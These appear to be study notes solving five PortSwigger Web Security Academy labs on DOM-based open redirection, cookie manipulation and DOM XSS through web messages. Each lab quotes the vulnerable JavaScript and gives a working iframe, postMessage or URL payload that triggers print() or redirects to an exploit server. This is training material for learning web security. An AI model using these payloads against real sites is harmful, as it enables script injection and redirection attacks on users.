### 1. Lab: DOM-based open redirection
> This lab contains a DOM-based open-redirection vulnerability. To solve this lab, exploit this vulnerability and redirect the victim to the exploit server.

```html
<a href='[#](https://0a33003303c599418093035b009700cf.web-security-academy.net/post?postId=1&returnUrl=https://exploit-0a2000e10389995d8063027a0131000d.exploit-server.net/exploit#)' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); location.href = returnUrl ? returnUrl[1] : "/"'>Back to Blog</a>
```
![[Pasted image 20250827204551.png]]
The `url` parameter contains an open redirection vulnerability. So if we enter the exploit server's URL into the parameter then we can able to solve the lab.
> Solution: https://LAB_ID.web-security-academy.net/post?postId=1&url=https://EXPLOIT_SERVER_ID.exploit-server.net/exploit#

### 2. Lab: DOM-based cookie manipulation
> This lab demonstrates DOM-based client-side cookie manipulation. To solve this lab, inject a cookie that will cause XSS on a different page and call the print() function. You will need to use the exploit server to direct the victim to the correct pages.

If we look into the javascript file, we will see it is setting `window.location` as `document.cookie`.
```js
<script>document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
</script>
```
`/product?productId=1&%27><script>print()</script>`
![[Pasted image 20250827214125.png]]
So we will use iframe: `<iframe src="https://LAB_ID.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://LAB_ID.web-security-academy.net';window.x=1;">`
The original source of the `iframe` matches the URL of one of the product pages, except there is a JavaScript payload added to the end. When the `iframe` loads for the first time, the browser temporarily opens the malicious URL, which is then saved as the value of the `lastViewedProduct` cookie. The `onload` event handler ensures that the victim is then immediately redirected to the home page, unaware that this manipulation ever took place. While the victim's browser has the poisoned cookie saved, loading the home page will cause the payload to execute.

### 3. Lab: DOM XSS using web messages
> This lab demonstrates a simple web message vulnerability. To solve this lab, use the exploit server to post a message to the target site that causes the print() function to be called.

When we look at source code, we will see this,
```js
<script>
    window.addEventListener('message', function(e) {
        document.getElementById('ads').innerHTML = e.data;
    })
</script>
```
When the iframe loads, the postMessage() method sends a web message to the home page. The event listener, which is intended to serve ads, takes the content of the web message and inserts it into the div with the ID ads. However, in this case it inserts our img tag, which contains an invalid src attribute. This throws an error, which causes the onerror event handler to execute our payload.
Payload: `<iframe src="https://LAB_ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">`

### 4. Lab: DOM XSS using web messages and a JavaScript URL
> This lab demonstrates a DOM-based redirection vulnerability that is triggered by web messaging. To solve this lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the `print()` function.

The home page contains an `addEventListener()` call that listens for a web message. The JavaScript contains a flawed `indexOf()` check that looks for the strings `"http:"` or `"https:"` anywhere within the web message. It also contains the sink `location.href`.
```js
<script>
    window.addEventListener('message', function(e) {
        var url = e.data;
        if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
            location.href = url;
        }
    }, false);
</script>
```
Payload: `<iframe src="https://LAB_ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">`

### 5. Lab: DOM XSS using web messages and JSON.parse
> This lab uses web messaging and parses the message as JSON. To solve the lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the `print()` function.

The home page contains an event listener that listens for a web message. This event listener expects a string that is parsed using `JSON.parse()`. In the JavaScript, we can see that the event listener expects a `type` property and that the `load-channel` case of the `switch` statement changes the `iframe src` attribute.
```js
<script>
    window.addEventListener('message', function(e) {
        var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
        document.body.appendChild(iframe);
        try {
            d = JSON.parse(e.data);
        } catch(e) {
            return;
        }
        switch(d.type) {
            case "page-load":
                ACMEplayer.element.scrollIntoView();
                break;
            case "load-channel":
                ACMEplayer.element.src = d.url;
                break;
            case "player-height-changed":
                ACMEplayer.element.style.width = d.width + "px";
                ACMEplayer.element.style.height = d.height + "px";
                break;
        }
    }, false);
</script>
```
Payload: `<iframe src=https://LAB_ID.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>`